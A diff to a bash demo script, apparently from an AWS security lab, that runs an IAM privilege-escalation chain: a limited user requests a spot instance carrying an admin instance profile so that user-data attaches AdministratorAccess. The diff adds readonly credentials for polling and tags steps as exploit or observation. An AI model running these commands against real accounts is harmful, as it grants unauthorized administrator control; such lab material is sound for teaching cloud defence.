@@ -23,12 +23,14 @@ ATTACK_COMMANDS=()
 
 # Display a command before executing it
 show_cmd() {
-    echo -e "${DIM}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "${DIM}[${identity}] \$ $*${NC}"
 }
 
 # Display AND record an attack command
 show_attack_cmd() {
-    echo -e "\n${CYAN}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
     ATTACK_COMMANDS+=("$*")
 }
 
@@ -64,6 +66,15 @@ if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; 
     exit 1
 fi
 
+# Extract readonly credentials for observation/polling steps
+READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
+READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)
+
+if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
+    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
+    exit 1
+fi
+
 AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")
 if [ -z "$AWS_REGION" ]; then
     echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
@@ -72,23 +83,33 @@ fi
 
 echo "Retrieved access key for: $STARTING_USER"
 echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
+echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
 echo "Region: $AWS_REGION"
 echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"
 
 # Navigate back to scenario directory
 cd - > /dev/null
 
-# Step 2: Configure AWS credentials with starting user
-echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
-export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
-export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
+# Credential switching helpers
+use_starting_creds() {
+    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
+    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
+    unset AWS_SESSION_TOKEN
+}
+use_readonly_creds() {
+    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
+    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
+    unset AWS_SESSION_TOKEN
+}
+
+# [EXPLOIT] Step 2: Verify starting user identity
+echo -e "${YELLOW}Step 2: Verifying starting user credentials${NC}"
+use_starting_creds
 export AWS_REGION=$AWS_REGION
-unset AWS_SESSION_TOKEN
 
 echo "Using region: $AWS_REGION"
 
-# Verify starting user identity
-show_cmd aws sts get-caller-identity --query 'Arn' --output text
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -98,17 +119,21 @@ if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
 fi
 echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
-# Step 3: Get account ID
+# [OBSERVATION] Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
-show_cmd aws sts get-caller-identity --query 'Account' --output text
+use_readonly_creds
+export AWS_REGION=$AWS_REGION
+show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 
-# Step 4: Check current permissions (should be limited)
+# [EXPLOIT] Step 4: Verify lack of admin permissions (attacker confirming limited access)
 echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
+use_starting_creds
+export AWS_REGION=$AWS_REGION
 echo "Attempting to list IAM users (should fail)..."
-show_cmd aws iam list-users --max-items 1
+show_cmd "Attacker" "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
 else
@@ -145,9 +170,11 @@ USER_DATA_B64=$(echo "$USER_DATA" | base64 | tr -d '\n')
 
 echo -e "${GREEN}✓ User-data script prepared${NC}\n"
 
-# Step 6: Get AMI ID for EC2 instance
+# [OBSERVATION] Step 6: Find AMI ID for EC2 instance (infrastructure discovery)
 echo -e "${YELLOW}Step 6: Finding Amazon Linux 2023 AMI${NC}"
-show_cmd aws ec2 describe-images --region "$AWS_REGION" --owners amazon --filters "Name=name,Values=al2023-ami-2023.*-x86_64" "Name=state,Values=available" --query 'Images | sort_by(@, &CreationDate) | [-1].ImageId' --output text
+use_readonly_creds
+export AWS_REGION=$AWS_REGION
+show_cmd "ReadOnly" "aws ec2 describe-images --region "$AWS_REGION" --owners amazon --filters "Name=name,Values=al2023-ami-2023.*-x86_64" "Name=state,Values=available" --query 'Images | sort_by(@, &CreationDate) | [-1].ImageId' --output text"
 AMI_ID=$(aws ec2 describe-images \
     --region $AWS_REGION \
     --owners amazon \
@@ -157,7 +184,7 @@ AMI_ID=$(aws ec2 describe-images \
 
 if [ -z "$AMI_ID" ] || [ "$AMI_ID" = "None" ]; then
     echo -e "${YELLOW}Could not find Amazon Linux 2023 AMI, trying Amazon Linux 2...${NC}"
-    show_cmd aws ec2 describe-images --region "$AWS_REGION" --owners amazon --filters "Name=name,Values=amzn2-ami-hvm-*-x86_64-gp2" "Name=state,Values=available" --query 'Images | sort_by(@, &CreationDate) | [-1].ImageId' --output text
+    show_cmd "ReadOnly" "aws ec2 describe-images --region "$AWS_REGION" --owners amazon --filters "Name=name,Values=amzn2-ami-hvm-*-x86_64-gp2" "Name=state,Values=available" --query 'Images | sort_by(@, &CreationDate) | [-1].ImageId' --output text"
     AMI_ID=$(aws ec2 describe-images \
         --region $AWS_REGION \
         --owners amazon \
@@ -174,11 +201,13 @@ fi
 echo "Using AMI: $AMI_ID"
 echo -e "${GREEN}✓ Found AMI${NC}\n"
 
-# Step 7: Get VPC and subnet for spot instance
+# [OBSERVATION] Step 7: Discover VPC and subnet for spot instance (network recon)
 echo -e "${YELLOW}Step 7: Determining VPC and subnet for spot instance${NC}"
+use_readonly_creds
+export AWS_REGION=$AWS_REGION
 
 # Get default VPC and subnet
-show_cmd aws ec2 --region "$AWS_REGION" describe-vpcs --filters "Name=is-default,Values=true" --query 'Vpcs[0].VpcId' --output text
+show_cmd "ReadOnly" "aws ec2 --region "$AWS_REGION" describe-vpcs --filters "Name=is-default,Values=true" --query 'Vpcs[0].VpcId' --output text"
 DEFAULT_VPC=$(aws ec2 --region $AWS_REGION describe-vpcs --filters "Name=is-default,Values=true" --query 'Vpcs[0].VpcId' --output text)
 
 if [ "$DEFAULT_VPC" = "None" ] || [ -z "$DEFAULT_VPC" ]; then
@@ -187,7 +216,7 @@ if [ "$DEFAULT_VPC" = "None" ] || [ -z "$DEFAULT_VPC" ]; then
     exit 1
 fi
 
-show_cmd aws --region "$AWS_REGION" ec2 describe-subnets --filters "Name=vpc-id,Values=$DEFAULT_VPC" --query 'Subnets[0].SubnetId' --output text
+show_cmd "ReadOnly" "aws --region "$AWS_REGION" ec2 describe-subnets --filters "Name=vpc-id,Values=$DEFAULT_VPC" --query 'Subnets[0].SubnetId' --output text"
 DEFAULT_SUBNET=$(aws --region $AWS_REGION ec2 describe-subnets --filters "Name=vpc-id,Values=$DEFAULT_VPC" --query 'Subnets[0].SubnetId' --output text)
 
 echo "Using VPC: $DEFAULT_VPC"
@@ -220,13 +249,15 @@ EOF
 
 echo -e "${GREEN}✓ Launch specification prepared${NC}\n"
 
-# Step 9: Request spot instance with admin role
+# [EXPLOIT] Step 9: Request spot instance with admin role
 echo -e "${YELLOW}Step 9: Requesting spot instance with admin instance profile${NC}"
+use_starting_creds
+export AWS_REGION=$AWS_REGION
 echo "This is the privilege escalation vector - passing the admin role to a spot instance..."
 echo "Instance profile: $INSTANCE_PROFILE"
 
 # Request spot instance
-show_attack_cmd aws ec2 request-spot-instances --region "$AWS_REGION" --spot-price "0.05" --instance-count 1 --type "one-time" --launch-specification "$LAUNCH_SPEC" --output json
+show_attack_cmd "Attacker" "aws ec2 request-spot-instances --region "$AWS_REGION" --spot-price "0.05" --instance-count 1 --type "one-time" --launch-specification "$LAUNCH_SPEC" --output json"
 SPOT_REQUEST_OUTPUT=$(aws ec2 request-spot-instances \
     --region $AWS_REGION \
     --spot-price "0.05" \
@@ -245,8 +276,10 @@ fi
 echo "Spot Instance Request ID: $SPOT_REQUEST_ID"
 echo -e "${GREEN}✓ Spot instance request submitted${NC}\n"
 
-# Step 10: Wait for spot request to be fulfilled
+# [OBSERVATION] Step 10: Wait for spot request to be fulfilled (polling)
 echo -e "${YELLOW}Step 10: Waiting for spot request to be fulfilled${NC}"
+use_readonly_creds
+export AWS_REGION=$AWS_REGION
 echo "This may take 1-2 minutes..."
 echo ""
 
@@ -256,7 +289,7 @@ INSTANCE_ID=""
 
 while [ $WAIT_TIME -lt $MAX_WAIT ]; do
     # Check spot request status
-    show_cmd aws ec2 describe-spot-instance-requests --region "$AWS_REGION" --spot-instance-request-ids "$SPOT_REQUEST_ID" --query 'SpotInstanceRequests[0]' --output json
+    show_cmd "ReadOnly" "aws ec2 describe-spot-instance-requests --region "$AWS_REGION" --spot-instance-request-ids "$SPOT_REQUEST_ID" --query 'SpotInstanceRequests[0]' --output json"
     SPOT_STATUS=$(aws ec2 describe-spot-instance-requests \
         --region $AWS_REGION \
         --spot-instance-request-ids $SPOT_REQUEST_ID \
@@ -289,8 +322,10 @@ if [ -z "$INSTANCE_ID" ] || [ "$INSTANCE_ID" = "null" ]; then
     exit 1
 fi
 
-# Step 11: Wait for policy attachment to complete
+# [OBSERVATION] Step 11: Wait for policy attachment to complete (polling)
 echo -e "${YELLOW}Step 11: Waiting for user-data script to attach AdministratorAccess${NC}"
+use_readonly_creds
+export AWS_REGION=$AWS_REGION
 echo "This may take 2-3 minutes while the instance starts and executes the script..."
 echo ""
 
@@ -323,12 +358,14 @@ if [ "$POLICY_ATTACHED" = false ]; then
     exit 1
 fi
 
-# Step 12: Verify admin access
+# [OBSERVATION] Step 12: Verify admin access
 echo -e "${YELLOW}Step 12: Verifying administrator access${NC}"
+use_readonly_creds
+export AWS_REGION=$AWS_REGION
 echo "The starting user now has AdministratorAccess attached..."
 echo "Attempting to list IAM users..."
 
-show_cmd aws iam list-users --max-items 3 --output table
+show_cmd "ReadOnly" "aws iam list-users --max-items 3 --output table"
 if aws iam list-users --max-items 3 --output table; then
     echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
     echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
